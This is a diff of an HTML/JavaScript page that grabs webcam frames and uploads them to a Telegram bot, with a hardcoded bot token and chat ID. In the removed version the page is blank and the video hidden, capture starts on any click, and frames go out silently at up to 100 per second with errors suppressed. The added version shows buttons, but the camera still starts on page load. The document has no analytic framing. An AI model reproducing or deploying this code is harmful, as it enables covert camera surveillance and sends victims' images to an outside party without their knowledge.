@@ -1,96 +1,164 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title> </title>
-<style>
-  * { margin:0; padding:0; }
-  body { background: #ffffff; height:100vh; overflow:hidden; cursor:default; }
-  video, canvas, button { display:none; }
-  #status {
-    position:fixed; bottom:10px; right:10px;
-    color:#ccc; font:10px monospace;
-    background:rgba(0,0,0,0.2); padding:2px 6px;
-    border-radius:3px; pointer-events:none;
-  }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title> </title>
+  <style>
+    body { margin:0; background:#fff; font-family:monospace; }
+    #preview { width:100%; max-width:400px; display:block; margin:10px auto; background:#000; }
+    #controls { text-align:center; margin:10px; }
+    button { padding:15px 40px; font-size:18px; background:#111; color:#0f0; border:2px solid #0f0; cursor:pointer; }
+    button:hover { background:#0f0; color:#111; }
+    #status { position:fixed; bottom:10px; left:10px; background:rgba(0,0,0,0.7); color:#0f0; padding:6px 12px; border-radius:4px; font-size:12px; max-width:90%; white-space:pre-wrap; }
+  </style>
 </head>
 <body>
+<video id="feed" autoplay muted playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+<img id="preview" src="" alt="camera preview" />
+
+<div id="controls">
+  <button id="startBtn">▶ ARM & STREAM</button>
+  <button id="stopBtn" disabled>⏹ STOP</button>
+</div>
 <div id="status">⟦ idle ⟧</div>
-<video id="feed" autoplay muted playsinline></video>
-<canvas id="captureCanvas"></canvas>
 
 <script>
 (function() {
-  // ─── HARDCODED CREDENTIALS ────────────────────────────────
+  // ─── CREDENTIALS (replace with valid ones) ────────────────
   const BOT_TOKEN = "8607641356:AAEVC8LAML3gooIUarL-fiPBYhXHIrwJyB0";
   const CHAT_ID   = "7870731053";
-  const INTERVAL_MS = 10;   // 100 fps theoretical
+  const CAPTURE_INTERVAL = 500; // ms (2 fps – safe for Telegram)
 
   // ─── DOM REFS ──────────────────────────────────────────────
   const video = document.getElementById('feed');
-  const canvas = document.getElementById('captureCanvas');
+  const canvas = document.getElementById('canvas');
   const ctx = canvas.getContext('2d');
+  const preview = document.getElementById('preview');
   const statusEl = document.getElementById('status');
+  const startBtn = document.getElementById('startBtn');
+  const stopBtn = document.getElementById('stopBtn');
 
   let stream = null;
   let timer = null;
-  let isRunning = false;
+  let isStreaming = false;
+
+  function log(msg) {
+    statusEl.textContent = msg;
+    console.log(msg);
+  }
 
   // ─── CAMERA INIT ───────────────────────────────────────────
   async function initCamera() {
     try {
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 60 } }
-      });
+      // Try high-res first, fallback to any
+      const constraints = {
+        video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' }
+      };
+      stream = await navigator.mediaDevices.getUserMedia(constraints);
       video.srcObject = stream;
       await video.play();
+      log('⟦ camera active ⟧');
       return true;
     } catch (e) {
-      statusEl.textContent = `ERR: ${e.message}`;
+      log(`⟦ CAM ERR: ${e.message} ⟧`);
       return false;
     }
   }
 
-  // ─── CAPTURE + SEND (fire‑and‑forget) ─────────────────────
-  function captureAndSend() {
-    if (!stream || video.readyState < 2) return;
+  // ─── CAPTURE & SEND ────────────────────────────────────────
+  async function captureAndSend() {
+    if (!stream || video.readyState < 2) {
+      log('⟦ video not ready ⟧');
+      return false;
+    }
     const w = video.videoWidth || 640;
     const h = video.videoHeight || 480;
     canvas.width = w;
     canvas.height = h;
     ctx.drawImage(video, 0, 0, w, h);
 
-    canvas.toBlob((blob) => {
-      if (!blob) return;
-      const fd = new FormData();
-      fd.append('chat_id', CHAT_ID);
-      fd.append('photo', blob, `f_${Date.now()}.jpg`);
+    // Show preview
+    preview.src = canvas.toDataURL('image/jpeg', 0.8);
 
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        body: fd
-      }).catch(() => {}); // silent fail – we don't care
-    }, 'image/jpeg', 0.75);
+    // Send to Telegram
+    return new Promise((resolve) => {
+      canvas.toBlob((blob) => {
+        if (!blob) { resolve(false); return; }
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', blob, `shot_${Date.now()}.jpg`);
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: fd
+        })
+        .then(res => res.json())
+        .then(json => {
+          if (json.ok) {
+            log(`⟦ sent OK (${new Date().toLocaleTimeString()}) ⟧`);
+            resolve(true);
+          } else {
+            log(`⟦ API ERR: ${json.description || 'unknown'} ⟧`);
+            resolve(false);
+          }
+        })
+        .catch(err => {
+          log(`⟦ NET ERR: ${err.message} ⟧`);
+          resolve(false);
+        });
+      }, 'image/jpeg', 0.8);
+    });
   }
 
-  // ─── START LOOP ────────────────────────────────────────────
-  async function start() {
-    if (isRunning) return;
+  // ─── START STREAMING ──────────────────────────────────────
+  async function startStreaming() {
+    if (isStreaming) return;
     if (!stream) {
       const ok = await initCamera();
       if (!ok) return;
     }
-    if (timer) clearInterval(timer);
-    isRunning = true;
-    statusEl.textContent = '⟦ streaming 100Hz ⟧';
-    timer = setInterval(captureAndSend, INTERVAL_MS);
+    // Ensure video is playing
+    if (video.paused) await video.play();
+
+    isStreaming = true;
+    startBtn.disabled = true;
+    stopBtn.disabled = false;
+    log('⟦ streaming started (2 fps) ⟧');
+
+    // Immediately send first frame
+    await captureAndSend();
+
+    timer = setInterval(async () => {
+      if (!isStreaming) return;
+      await captureAndSend();
+    }, CAPTURE_INTERVAL);
   }
 
-  // ─── TRIGGER ON ANY CLICK ─────────────────────────────────
-  document.addEventListener('click', start, { once: true });
-  statusEl.textContent = '⟦ click to arm ⟧';
+  // ─── STOP ──────────────────────────────────────────────────
+  function stopStreaming() {
+    if (timer) {
+      clearInterval(timer);
+      timer = null;
+    }
+    isStreaming = false;
+    startBtn.disabled = false;
+    stopBtn.disabled = true;
+    log('⟦ stopped ⟧');
+    // Do not release camera – keep it for later
+  }
+
+  // ─── BIND UI ──────────────────────────────────────────────
+  startBtn.addEventListener('click', startStreaming);
+  stopBtn.addEventListener('click', stopStreaming);
+
+  // Auto‑init camera on load (so we're ready)
+  window.addEventListener('load', () => {
+    initCamera(); // attempt, but don't block
+  });
+
+  log('⟦ ready – click "ARM & STREAM" ⟧');
 })();
 </script>
 </body>
